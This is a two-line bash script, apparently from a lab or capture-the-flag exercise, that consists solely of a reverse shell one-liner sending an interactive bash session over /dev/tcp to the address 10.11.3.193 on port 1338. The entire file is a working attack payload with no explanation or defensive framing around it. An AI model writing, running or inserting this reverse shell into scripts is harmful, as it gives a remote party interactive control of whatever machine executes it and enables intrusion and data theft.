#!/bin/bash
bash -c 'exec bash -i &>/dev/tcp/10.11.3.193/1338 <&1'
